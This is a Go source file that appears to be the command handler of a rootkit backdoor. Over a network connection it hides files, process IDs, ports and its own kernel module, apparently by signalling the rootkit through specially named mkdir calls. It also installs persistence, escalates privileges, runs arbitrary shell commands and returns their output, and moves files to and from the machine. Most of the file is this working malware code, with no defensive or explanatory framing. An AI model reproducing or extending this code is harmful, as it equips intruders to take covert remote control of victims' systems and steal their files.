package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func handlePing(r *bufio.Reader, conn net.Conn, arg string) error {
	_, err := fmt.Fprintln(conn, "PONG")
	return err
}

func handleStatus(r *bufio.Reader, conn net.Conn, arg string) error {
	_, err := fmt.Fprintf(conn, "PID=%d UID=%d\n", os.Getpid(), os.Getuid())
	return err
}

func handleHide(r *bufio.Reader, conn net.Conn, arg string) error {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("h.m"); err != nil {
			_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
			return writeErr
		}
		_, err := fmt.Fprintln(conn, "OK")
		return err
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		fmt.Fprintln(conn, "ERR missing argument")
		return nil
	}

	prefixes := map[string]string{
		"FILE": "h.f", "PID": "h.i", "PORT": "h.p", "CONTENT": "h.c",
	}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		fmt.Fprintln(conn, "ERR unknown hide target")
		return nil
	}

	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
		return writeErr
	}
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handleUnhide(r *bufio.Reader, conn net.Conn, arg string) error {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("u.m"); err != nil {
			_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
			return writeErr
		}
		_, err := fmt.Fprintln(conn, "OK")
		return err
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		fmt.Fprintln(conn, "ERR missing argument")
		return nil
	}

	prefixes := map[string]string{
		"FILE": "u.f", "PID": "u.i", "PORT": "u.p", "CONTENT": "u.c",
	}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		fmt.Fprintln(conn, "ERR unknown unhide target")
		return nil
	}

	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
		return writeErr
	}
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handlePersist(r *bufio.Reader, conn net.Conn, arg string) error {
	_ = mkdirCmd("u.c.rklings")
	err := installPersistence()
	_ = mkdirCmd("h.c.rklings")
	if err != nil {
		_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
		return writeErr
	}
	_, err = fmt.Fprintln(conn, "OK")
	return err
}

func handleUnpersist(r *bufio.Reader, conn net.Conn, arg string) error {
	_ = mkdirCmd("u.c.rklings")
	err := removePersistence()
	_ = mkdirCmd("h.c.rklings")
	if err != nil {
		_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
		return writeErr
	}
	_, err = fmt.Fprintln(conn, "OK")
	return err
}

func handleEscalate(r *bufio.Reader, conn net.Conn, arg string) error {
	if arg != "" {
		if err := mkdirCmd("e." + arg); err != nil {
			_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
			return writeErr
		}
	} else {
		if err := mkdirCmd("e"); err != nil {
			_, writeErr := fmt.Fprintf(conn, "ERR %v\n", err)
			return writeErr
		}
	}
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handleShell(r *bufio.Reader, conn net.Conn, arg string) error {
	var stdout, stderr bytes.Buffer
	cmd := exec.Command("/bin/sh", "-c", arg)
	cmd.Stdout, cmd.Stderr = &stdout, &stderr
	err := cmd.Run()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if cmd.ProcessState != nil {
			exitCode = cmd.ProcessState.ExitCode()
		}
	}
	payload, marshalErr := json.Marshal(struct {
		Stdout   string `json:"stdout"`
		Stderr   string `json:"stderr"`
		ExitCode int    `json:"exit_code"`
	}{stdout.String(), stderr.String(), exitCode})
	if marshalErr != nil {
		return marshalErr
	}
	_, err = fmt.Fprintf(conn, "SHELL_RESULT %s\n", payload)
	return err
}

func handleDownload(r *bufio.Reader, conn net.Conn, arg string) error {
	path := strings.TrimSpace(arg)
	f, err := os.Open(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	fmt.Fprintf(conn, "%d\n", info.Size())
	io.Copy(conn, f)
	return nil
}

func handleUpload(r *bufio.Reader, conn net.Conn, arg string) error {
	path := strings.TrimSpace(arg)
	sizeLine, err := r.ReadString('\n')
	if err != nil {
		fmt.Fprintln(conn, "ERR missing size")
		return nil
	}
	size, err := strconv.ParseInt(strings.TrimSpace(sizeLine), 10, 64)
	if err != nil {
		fmt.Fprintf(conn, "ERR bad size: %v\n", err)
		return nil
	}

	f, err := os.Create(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	_, err = io.Copy(f, io.LimitReader(r, size))
	f.Close()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	_, err = fmt.Fprintln(conn, "OK")
	return err
}
